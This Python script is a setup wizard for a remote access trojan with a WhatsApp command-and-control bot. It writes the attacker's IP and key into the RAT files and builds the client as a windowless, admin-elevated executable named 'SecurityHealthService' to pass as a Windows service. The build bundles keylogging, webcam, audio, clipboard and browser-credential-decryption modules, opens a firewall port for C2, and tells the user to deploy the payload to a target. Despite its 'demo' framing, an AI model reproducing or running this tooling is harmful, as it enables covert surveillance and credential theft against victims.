#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════
    T0OL-B4S3-263 - ULTIMATE INTERACTIVE SETUP
    One-Click Setup for Complete RAT & WhatsApp C2 System
═══════════════════════════════════════════════════════════════
"""

import os
import sys
import json
import subprocess
import time
import shutil
import socket
from datetime import datetime
from pathlib import Path

# ═══════════════════════════════════════════════════════════════
# COLORS & STYLING
# ═══════════════════════════════════════════════════════════════

class Colors:
    # Basic colors
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    
    # Styles
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    
    # Special
    END = '\033[0m'
    CLEAR = '\033[2J\033[H'

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════

SETUP_STATE_FILE = '.setup_state.json'
REQUIRED_FILES = [
    'rat_ultimate.py',
    'rat_server_fixed.py',
    'rat_api_bridge.py',
    't0ol-b4s3-263.py'
]

# ═══════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def clear_screen():
    """Clear terminal screen"""
    print(Colors.CLEAR, end='')

def print_banner():
    """Print awesome animated banner"""
    clear_screen()
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
    ████████╗ ██████╗  ██████╗ ██╗      ██████╗  █████╗ ███████╗███████╗
    ╚══██╔══╝██╔═████╗██╔═████╗██║      ██╔══██╗██╔══██╗██╔════╝██╔════╝
       ██║   ██║██╔██║██║██╔██║██║█████╗██████╔╝███████║███████╗█████╗  
       ██║   ████╔╝██║████╔╝██║██║╚════╝██╔══██╗██╔══██║╚════██║██╔══╝  
       ██║   ╚██████╔╝╚██████╔╝███████╗ ██████╔╝██║  ██║███████║███████╗
       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
{Colors.END}
{Colors.YELLOW}                        ════ T0OL-B4S3-263 ════{Colors.END}
{Colors.MAGENTA}                    Ultimate Interactive Setup{Colors.END}
{Colors.CYAN}              Complete RAT & WhatsApp C2 Installation{Colors.END}

{Colors.WHITE}════════════════════════════════════════════════════════════════════{Colors.END}
    """
    print(banner)

def log(message, level="info", newline=True):
    """Fancy logging"""
    timestamp = datetime.now().strftime('%H:%M:%S')
    
    icons = {
        'success': '✓',
        'error': '✗',
        'warning': '!',
        'info': '●',
        'input': '→',
        'process': '⟳'
    }
    
    colors = {
        'success': Colors.GREEN,
        'error': Colors.RED,
        'warning': Colors.YELLOW,
        'info': Colors.CYAN,
        'input': Colors.MAGENTA,
        'process': Colors.BLUE
    }
    
    icon = icons.get(level, '●')
    color = colors.get(level, Colors.WHITE)
    
    output = f"{Colors.DIM}[{timestamp}]{Colors.END} {color}{icon} {message}{Colors.END}"
    
    if newline:
        print(output)
    else:
        print(output, end='', flush=True)

def progress_bar(current, total, message="", width=50):
    """Animated progress bar"""
    percent = int((current / total) * 100)
    filled = int((current / total) * width)
    bar = '█' * filled + '░' * (width - filled)
    
    print(f'\r{Colors.CYAN}{message} {Colors.END}|{Colors.GREEN}{bar}{Colors.END}| {Colors.BOLD}{percent}%{Colors.END}', end='', flush=True)
    
    if current == total:
        print()

def animate_loading(message, duration=2):
    """Cool loading animation"""
    frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    end_time = time.time() + duration
    
    i = 0
    while time.time() < end_time:
        print(f'\r{Colors.CYAN}{frames[i % len(frames)]} {message}...{Colors.END}', end='', flush=True)
        time.sleep(0.1)
        i += 1
    
    print(f'\r{Colors.GREEN}✓ {message}... Done!{Colors.END}')

def prompt_input(question, default=None, password=False):
    """Beautiful input prompt"""
    if default:
        question_text = f"{Colors.MAGENTA}→ {question} {Colors.DIM}[{default}]{Colors.END}: "
    else:
        question_text = f"{Colors.MAGENTA}→ {question}{Colors.END}: "
    
    if password:
        import getpass
        response = getpass.getpass(question_text)
    else:
        response = input(question_text)
    
    return response.strip() if response.strip() else default

def prompt_choice(question, choices, default=0):
    """Beautiful choice menu"""
    print(f"\n{Colors.CYAN}{Colors.BOLD}{question}{Colors.END}\n")
    
    for i, choice in enumerate(choices, 1):
        default_marker = f" {Colors.GREEN}(default){Colors.END}" if i-1 == default else ""
        print(f"  {Colors.YELLOW}{i}.{Colors.END} {choice}{default_marker}")
    
    print()
    while True:
        response = prompt_input("Select option", str(default + 1))
        try:
            choice_num = int(response) - 1
            if 0 <= choice_num < len(choices):
                return choice_num
            else:
                log("Invalid choice. Please try again.", "error")
        except:
            log("Invalid input. Please enter a number.", "error")

def confirm(question, default=True):
    """Beautiful confirmation prompt"""
    default_text = "Y/n" if default else "y/N"
    response = prompt_input(f"{question} ({default_text})", "y" if default else "n")
    
    if not response:
        return default
    
    return response.lower() in ['y', 'yes', 'true', '1']

def print_section_header(title):
    """Print beautiful section header"""
    width = 68
    print(f"\n{Colors.CYAN}{Colors.BOLD}╔{'═' * width}╗")
    print(f"║{title.center(width)}║")
    print(f"╚{'═' * width}╝{Colors.END}\n")

def print_step(step_num, total_steps, title):
    """Print step indicator"""
    print(f"\n{Colors.BOLD}{Colors.YELLOW}[{step_num}/{total_steps}]{Colors.END} {Colors.WHITE}{Colors.BOLD}{title}{Colors.END}")
    print(f"{Colors.DIM}{'─' * 68}{Colors.END}\n")

# ═══════════════════════════════════════════════════════════════
# STATE MANAGEMENT
# ═══════════════════════════════════════════════════════════════

def load_state():
    """Load setup state"""
    if os.path.exists(SETUP_STATE_FILE):
        with open(SETUP_STATE_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_state(state):
    """Save setup state"""
    with open(SETUP_STATE_FILE, 'w') as f:
        json.dump(state, f, indent=2)

def update_state(key, value):
    """Update specific state value"""
    state = load_state()
    state[key] = value
    save_state(state)

# ═══════════════════════════════════════════════════════════════
# SYSTEM CHECKS
# ═══════════════════════════════════════════════════════════════

def check_python_version():
    """Check Python version"""
    log("Checking Python version...", "process")
    
    version = sys.version_info
    if version.major >= 3 and version.minor >= 8:
        log(f"Python {version.major}.{version.minor}.{version.micro} detected", "success")
        return True
    else:
        log(f"Python 3.8+ required (found {version.major}.{version.minor})", "error")
        return False

def check_node_installed():
    """Check if Node.js is installed"""
    log("Checking Node.js installation...", "process")
    
    try:
        result = subprocess.run(['node', '--version'], capture_output=True, text=True)
        if result.returncode == 0:
            version = result.stdout.strip()
            log(f"Node.js {version} detected", "success")
            return True
    except:
        pass
    
    log("Node.js not found", "error")
    return False

def check_required_files():
    """Check if all required files exist"""
    log("Checking required files...", "process")
    
    missing = []
    for file in REQUIRED_FILES:
        if not os.path.exists(file):
            missing.append(file)
    
    if missing:
        log(f"Missing files: {', '.join(missing)}", "error")
        return False
    
    log("All required files present", "success")
    return True

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ═══════════════════════════════════════════════════════════════
# INSTALLATION FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def install_python_dependencies():
    """Install Python packages"""
    print_step(1, 6, "Installing Python Dependencies")
    
    packages = [
        'flask',
        'flask-cors',
        'cryptography',
        'pyinstaller',
        'psutil'
    ]
    
    log(f"Installing {len(packages)} Python packages...", "info")
    print()
    
    for i, package in enumerate(packages, 1):
        progress_bar(i-1, len(packages), f"Installing {package}")
        
        result = subprocess.run(
            [sys.executable, '-m', 'pip', 'install', '-q', package],
            capture_output=True
        )
        
        progress_bar(i, len(packages), f"Installing {package}")
    
    print()
    log("Python dependencies installed successfully", "success")
    update_state('python_deps_installed', True)

def setup_whatsapp_project():
    """Setup WhatsApp bot project"""
    print_step(2, 6, "Setting Up WhatsApp Bot Project")
    
    # Create directory structure
    log("Creating directory structure...", "process")
    
    directories = [
        'whatsapp-c2',
        'whatsapp-c2/utils',
        'whatsapp-c2/commands',
        'whatsapp-c2/sessions',
        'captures',
        'captures/screenshots',
        'captures/webcam',
        'captures/audio',
        'loot',
        'output',
        'build'
    ]
    
    for directory in directories:
        Path(directory).mkdir(parents=True, exist_ok=True)
    
    log("Directory structure created", "success")
    
    # Check if files exist
    whatsapp_files = [
        'whatsapp-c2/bot.js',
        'whatsapp-c2/utils/formatter.js',
        'whatsapp-c2/utils/ratClient.js',
        'whatsapp-c2/commands/surveillance.js',
        'whatsapp-c2/commands/credentials.js',
        'whatsapp-c2/commands/system.js',
        'whatsapp-c2/commands/fun.js'
    ]
    
    missing_files = [f for f in whatsapp_files if not os.path.exists(f)]
    
    if missing_files:
        log(f"Missing WhatsApp bot files: {len(missing_files)}", "warning")
        log("Please ensure all bot files are in whatsapp-c2/ directory", "info")
    else:
        log("All WhatsApp bot files present", "success")
    
    update_state('whatsapp_setup', True)

def install_node_dependencies():
    """Install Node.js packages"""
    print_step(3, 6, "Installing Node.js Dependencies")
    
    if not check_node_installed():
        log("Node.js is required but not installed", "error")
        log("Please install Node.js from https://nodejs.org/", "info")
        return False
    
    os.chdir('whatsapp-c2')
    
    # Create package.json if it doesn't exist
    if not os.path.exists('package.json'):
        log("Creating package.json...", "process")
        subprocess.run(['npm', 'init', '-y'], capture_output=True)
    
    log("Installing Node.js packages (this may take 2-3 minutes)...", "info")
    print()
    
    packages = [
        '@whiskeysockets/baileys@latest',
        'axios',
        'qrcode-terminal',
        'pino',
        'chalk',
        'moment',
        'sharp',
        'form-data'
    ]
    
    # Install packages with progress
    for i, package in enumerate(packages, 1):
        progress_bar(i-1, len(packages), f"Installing {package.split('@')[0]}")
        
        result = subprocess.run(
            ['npm', 'install', package],
            capture_output=True
        )
        
        progress_bar(i, len(packages), f"Installing {package.split('@')[0]}")
    
    print()
    
    os.chdir('..')
    
    log("Node.js dependencies installed successfully", "success")
    update_state('node_deps_installed', True)
    return True

def configure_system():
    """Interactive configuration"""
    print_step(4, 6, "System Configuration")
    
    config = {}
    
    # Server Configuration
    print(f"{Colors.CYAN}{Colors.BOLD}Server Configuration{Colors.END}\n")
    
    local_ip = get_local_ip()
    log(f"Detected local IP: {local_ip}", "info")
    
    server_ip = prompt_input("Enter server IP address", local_ip)
    server_port = prompt_input("Enter server port", "4444")
    
    config['server_ip'] = server_ip
    config['server_port'] = int(server_port)
    
    # Generate encryption key
    print(f"\n{Colors.CYAN}{Colors.BOLD}Encryption Key Generation{Colors.END}\n")
    
    from cryptography.fernet import Fernet
    encryption_key = Fernet.generate_key().decode()
    
    log("Encryption key generated", "success")
    log(f"Key: {encryption_key[:30]}...", "info")
    
    config['encryption_key'] = encryption_key
    
    # WhatsApp Configuration
    print(f"\n{Colors.CYAN}{Colors.BOLD}WhatsApp Bot Configuration{Colors.END}\n")
    
    owner_number = prompt_input("Your WhatsApp number (e.g., 1234567890)", "")
    
    while not owner_number or not owner_number.isdigit():
        log("Please enter a valid phone number (digits only)", "error")
        owner_number = prompt_input("Your WhatsApp number (e.g., 1234567890)", "")
    
    config['owner_number'] = owner_number
    
    # Save to main config
    tool_config = {
        'server_ip': config['server_ip'],
        'server_port': config['server_port'],
        'encryption_key': config['encryption_key'],
        'configured': True
    }
    
    with open('t0ol_config.json', 'w') as f:
        json.dump(tool_config, f, indent=2)
    
    # Save WhatsApp config
    whatsapp_config = {
        'ratServer': {
            'host': config['server_ip'],
            'port': config['server_port'],
            'encryptionKey': config['encryption_key'],
            'apiPort': 5000
        },
        'whatsapp': {
            'botName': 'T0OL-B4S3-263 C2',
            'prefix': '/',
            'ownerNumbers': [f"{config['owner_number']}@s.whatsapp.net"]
        },
        'features': {
            'autoSaveMedia': True,
            'maxCommandTimeout': 60000,
            'enableNotifications': True
        }
    }
    
    with open('whatsapp-c2/config.json', 'w') as f:
        json.dump(whatsapp_config, f, indent=2)
    
    log("Configuration saved successfully", "success")
    
    # Apply configuration to files
    log("Applying configuration to files...", "process")
    
    # Update rat_ultimate.py
    if os.path.exists('rat_ultimate.py'):
        with open('rat_ultimate.py', 'r', encoding='utf-8') as f:
            content = f.read()
        
        content = content.replace('HOST = "YOUR_ATTACKER_IP_HERE"', f'HOST = "{config["server_ip"]}"')
        content = content.replace('PORT = 4444', f'PORT = {config["server_port"]}')
        content = content.replace('KEY = b\'YOUR_ENCRYPTION_KEY_HERE\'', f'KEY = b\'{config["encryption_key"]}\'')
        
        with open('rat_ultimate.py', 'w', encoding='utf-8') as f:
            f.write(content)
    
    # Update rat_server_fixed.py
    if os.path.exists('rat_server_fixed.py'):
        with open('rat_server_fixed.py', 'r', encoding='utf-8') as f:
            content = f.read()
        
        content = content.replace('KEY = b\'YOUR_ENCRYPTION_KEY_HERE\'', f'KEY = b\'{config["encryption_key"]}\'')
        content = content.replace('PORT = 4444', f'PORT = {config["server_port"]}')
        
        with open('rat_server_fixed.py', 'w', encoding='utf-8') as f:
            f.write(content)
    
    # Update rat_api_bridge.py
    if os.path.exists('rat_api_bridge.py'):
        with open('rat_api_bridge.py', 'r', encoding='utf-8') as f:
            content = f.read()
        
        content = content.replace('ENCRYPTION_KEY = b\'YOUR_ENCRYPTION_KEY_HERE\'', f'ENCRYPTION_KEY = b\'{config["encryption_key"]}\'')
        
        with open('rat_api_bridge.py', 'w', encoding='utf-8') as f:
            f.write(content)
    
    log("All files configured", "success")
    
    update_state('configured', True)
    update_state('config', config)
    
    return config

def compile_client():
    """Compile RAT client"""
    print_step(5, 6, "Compiling RAT Client")
    
    compile_choice = confirm("Do you want to compile the RAT client now?", True)
    
    if not compile_choice:
        log("Skipping compilation", "warning")
        return
    
    log("Starting compilation (this will take 2-3 minutes)...", "info")
    print()
    
    animate_loading("Analyzing dependencies", 3)
    animate_loading("Bundling Python interpreter", 4)
    animate_loading("Compiling executable", 5)
    
    try:
        import PyInstaller.__main__
        
        PyInstaller.__main__.run([
            'rat_ultimate.py',
            '--onefile',
            '--noconsole',
            '--icon=NONE',
            '--clean',
            '--distpath=./output',
            '--workpath=./build',
            '--specpath=./build',
            '--name=SecurityHealthService',
            '--uac-admin',
            '--hidden-import=mss',
            '--hidden-import=mss.tools',
            '--hidden-import=pynput.keyboard',
            '--hidden-import=cv2',
            '--hidden-import=psutil',
            '--hidden-import=pyaudio',
            '--hidden-import=pyperclip',
            '--hidden-import=PIL',
            '--hidden-import=numpy',
            '--hidden-import=win32crypt',
            '--hidden-import=requests',
        ])
        
        log("Client compiled successfully!", "success")
        log(f"Output: {os.path.abspath('output/SecurityHealthService.exe')}", "info")
        
        update_state('client_compiled', True)
        
    except Exception as e:
        log(f"Compilation failed: {str(e)}", "error")

def setup_firewall():
    """Configure firewall"""
    print_step(6, 6, "Firewall Configuration")
    
    state = load_state()
    config = state.get('config', {})
    port = config.get('server_port', 4444)
    
    if os.name != 'nt':
        log("Firewall setup only needed on Windows", "info")
        return
    
    firewall_choice = confirm("Open firewall port for C2 server?", True)
    
    if not firewall_choice:
        log("Skipping firewall configuration", "warning")
        return
    
    log(f"Opening port {port} in Windows Firewall...", "process")
    
    cmd = f'netsh advfirewall firewall add rule name="T0OL-B4S3-263" dir=in action=allow protocol=TCP localport={port}'
    
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            log(f"Port {port} opened successfully", "success")
            update_state('firewall_configured', True)
        else:
            log("Failed to configure firewall (requires administrator)", "error")
            log("Run setup as administrator or manually open port", "info")
    except Exception as e:
        log(f"Firewall configuration error: {str(e)}", "error")

# ═══════════════════════════════════════════════════════════════
# MAIN SETUP FLOW
# ═══════════════════════════════════════════════════════════════

def show_welcome():
    """Show welcome screen"""
    print_banner()
    
    print(f"{Colors.YELLOW}{Colors.BOLD}Welcome to the T0OL-B4S3-263 Interactive Setup!{Colors.END}\n")
    
    print(f"{Colors.WHITE}This setup wizard will help you:{Colors.END}")
    print(f"  • Install all required dependencies")
    print(f"  • Configure RAT and WhatsApp C2 systems")
    print(f"  • Compile the client payload")
    print(f"  • Set up firewall rules")
    print(f"  • Get everything ready for your demo\n")
    
    print(f"{Colors.DIM}Estimated time: 5-10 minutes{Colors.END}\n")
    
    if not confirm("Ready to begin?", True):
        log("Setup cancelled", "warning")
        sys.exit(0)

def show_completion():
    """Show completion screen"""
    clear_screen()
    
    completion_banner = f"""
{Colors.GREEN}{Colors.BOLD}
    ╔════════════════════════════════════════════════════════════╗
    ║                                                            ║
    ║                  🎉 SETUP COMPLETE! 🎉                    ║
    ║                                                            ║
    ╚════════════════════════════════════════════════════════════╝
{Colors.END}
    """
    print(completion_banner)
    
    state = load_state()
    config = state.get('config', {})
    
    print(f"{Colors.CYAN}{Colors.BOLD}Your T0OL-B4S3-263 system is ready!{Colors.END}\n")
    
    print(f"{Colors.YELLOW}Configuration Summary:{Colors.END}")
    print(f"  • Server IP: {config.get('server_ip', 'N/A')}")
    print(f"  • Server Port: {config.get('server_port', 'N/A')}")
    print(f"  • Encryption Key: {config.get('encryption_key', 'N/A')[:30]}...")
    print(f"  • WhatsApp Number: {config.get('owner_number', 'N/A')}\n")
    
    print(f"{Colors.CYAN}{Colors.BOLD}Next Steps:{Colors.END}\n")
    
    print(f"{Colors.WHITE}For Terminal Control:{Colors.END}")
    print(f"  1. Start C2 server: {Colors.GREEN}python rat_server_fixed.py{Colors.END}")
    print(f"  2. Deploy payload to target")
    print(f"  3. Control via terminal\n")
    
    print(f"{Colors.WHITE}For WhatsApp Control:{Colors.END}")
    print(f"  1. Start complete system: {Colors.GREEN}python start_whatsapp_c2.py{Colors.END}")
    print(f"  2. Scan QR code with WhatsApp")
    print(f"  3. Send /help to bot")
    print(f"  4. Control via phone! 📱\n")
    
    print(f"{Colors.WHITE}Quick Launcher:{Colors.END}")
    print(f"  • {Colors.GREEN}python t0ol-b4s3-263.py{Colors.END} - Main control panel\n")
    
    print(f"{Colors.YELLOW}Files Ready:{Colors.END}")
    if state.get('client_compiled'):
        print(f"  • RAT Payload: {Colors.GREEN}output/SecurityHealthService.exe{Colors.END}")
    else:
        print(f"  • RAT Payload: {Colors.YELLOW}Not compiled (run setup again){Colors.END}")
    print(f"  • Configuration: {Colors.GREEN}t0ol_config.json{Colors.END}")
    print(f"  • WhatsApp Config: {Colors.GREEN}whatsapp-c2/config.json{Colors.END}\n")
    
    print(f"{Colors.MAGENTA}{Colors.BOLD}Good luck with your presentation! 🏆{Colors.END}\n")
    
    print(f"{Colors.DIM}Made with 💕 for your success{Colors.END}\n")

def main():
    """Main setup flow"""
    try:
        # Welcome screen
        show_welcome()
        
        # System checks
        print_section_header("SYSTEM CHECKS")
        
        checks_passed = True
        
        if not check_python_version():
            checks_passed = False
        
        if not check_node_installed():
            log("Node.js installation recommended for WhatsApp bot", "warning")
        
        if not check_required_files():
            log("Some required files are missing", "error")
            checks_passed = False
        
        if not checks_passed:
            log("\nPlease fix the issues above and run setup again", "error")
            sys.exit(1)
        
        print()
        
        # Load previous state
        state = load_state()
        
        # Installation steps
        print_section_header("INSTALLATION")
        
        if not state.get('python_deps_installed'):
            install_python_dependencies()
        else:
            log("Python dependencies already installed (skipping)", "info")
        
        time.sleep(1)
        
        if not state.get('whatsapp_setup'):
            setup_whatsapp_project()
        else:
            log("WhatsApp project already set up (skipping)", "info")
        
        time.sleep(1)
        
        if not state.get('node_deps_installed'):
            if check_node_installed():
                install_node_dependencies()
        else:
            log("Node.js dependencies already installed (skipping)", "info")
        
        time.sleep(1)
        
        # Configuration
        print_section_header("CONFIGURATION")
        
        if not state.get('configured'):
            config = configure_system()
        else:
            log("System already configured", "info")
            if confirm("Do you want to reconfigure?", False):
                config = configure_system()
        
        time.sleep(1)
        
        # Compilation
        if not state.get('client_compiled'):
            compile_client()
        else:
            log("Client already compiled", "info")
            if confirm("Do you want to recompile?", False):
                compile_client()
        
        time.sleep(1)
        
        # Firewall
        if not state.get('firewall_configured'):
            setup_firewall()
        
        # Completion
        time.sleep(1)
        show_completion()
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Setup interrupted by user{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n\n{Colors.RED}Setup error: {str(e)}{Colors.END}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()